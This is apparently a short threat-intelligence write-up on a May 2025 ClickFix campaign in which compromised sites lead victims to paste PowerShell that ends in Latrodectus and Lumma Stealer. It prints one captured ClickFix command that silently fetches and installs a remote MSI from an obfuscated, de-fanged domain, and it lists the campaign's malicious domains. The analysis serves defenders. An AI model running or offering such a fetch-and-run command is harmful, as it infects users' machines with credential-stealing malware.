2025-05-16 (FRIDAY): CLICKFIX ACTIVITY ENDING WITH LUMMA STEALER

AUTHOR:

- Zack Fink

ORIGINAL REFERENCE:

- https://x.com/SquiblydooBlog/status/1922375875548320203

BACKGROUND:

- "ClickFix" is a technique using legitimate but compromised websites that lead to malicious pages.
- These malicious pages have messages instructing victims to paste script into a run window.
- This script is most often malicious PowerShell script designed to infect Windows computers with malware.

NOTES:

- In this wave of ClickFix activity, the malicious PowerShell script retrieves an .msi file and runs it in system memory.
- From system memory, the .msi file drops a legitimate EXE and a malicious DLL used for DLL side-loading.
- The malicious DLL appears to be associated with Latroductus (Blackwidow) malware.
- The follow-up malware appears to be Lumma Stealer.

OVERALL INFECTION FLOW:

- Clickfix style script --> files for the initial infection --> Latrodectus --> Lumma Stealer

EXAMPLE OF CLICKFIX STYLE SCRIPT:

- "C:\WINDOWS\system32\WindowsPowerShell\v1.0\PowerShell.exe" -W Hidden -C "$i=New-Object -ComObject 
  WindowsInstaller.Installer;$i.UILevel=2;$u='htps://thob[.]live/'.Insert(2,'t');$i.InstallProduct($u,'')"; 
  Service connection checkup : 1734

- Note 1: The "htps://" above is not a typo. The script inserts another "t" using ".Insert(2,'t')"
- Note 2: The "thob[.]live" domain in above script is de-fanged.

EXAMPLES OF DOMAINS FROM THE INITIAL CLICKFIX STYLE SCRIPT:

-   atri[.]live
- m.bjeb[.]live
- b.ekoz[.]live
-   cqsf[.]live
-   rekx[.]live
-   thob[.]live
-   dlux[.]live
